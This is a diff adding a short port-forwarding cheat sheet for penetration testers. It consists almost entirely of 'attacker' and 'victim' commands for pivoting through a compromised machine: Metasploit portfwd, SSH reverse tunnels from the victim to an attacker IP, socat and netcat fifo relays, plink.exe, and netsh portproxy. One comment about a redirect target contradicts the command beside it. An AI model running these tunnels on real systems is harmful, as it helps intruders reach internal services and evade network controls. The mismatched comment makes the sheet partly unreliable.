@@ -1,0 +1,28 @@
+Source: https://ironhackers.es/en/cheatsheet/port-forwarding-cheatsheet/
+
+Tools: metasploit: portfwd add -l 8080 -p 80 -r 172.16.185.132
+Linux: ssh, socat, netcat 
+-Ssh from attacking machine: ssh -L 8080:localhost:80 -N -f test@172.16.185.132
+
+We can also run from the victim machine doing 
+ssh -R 8080:localhost:80 root@172.16.185.1 -N -f
+
+-socat : server (attacker) and client (victim) command 
+From server (attacker): socat -v TCP4-LISTEN:10000 TCP4-LISTEN:8080
+From client (victim): socat TCP4:172.16.185.1:10000 TCP4:localhost:80
+
+or simply 
+socat TCP-LISTEN:80,fork TCP:127.0.0.1:80
+(This is to redirect all port 80 conenctions to ip 202.54.1.5)
+
+
+-netcat: client and server command
+From victim: rm -f fifo; mkfifo fifo; nc -v -lk -p 8080 < fifo | nc -v localhost 80 > fifo
+From attacker: rm -f fifo; mkfifo fifo; nc -v -lk -p 8080 < fifo | nc 172.16.185.132 8080 > fifo
+
+Windows: metasploit, plink.exe, netsh
+Plink: (on victim: ssh to attacker): plink.exe -ssh test@172.16.75.1 -R 8080:localhost:80
+
+Netsh: 
+On victim: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1
+On attacker: rm -f fifo;mkfifo fifo;nc -v -lk -p 8080 < fifo | nc 192.168.1.38 8080 > fifo
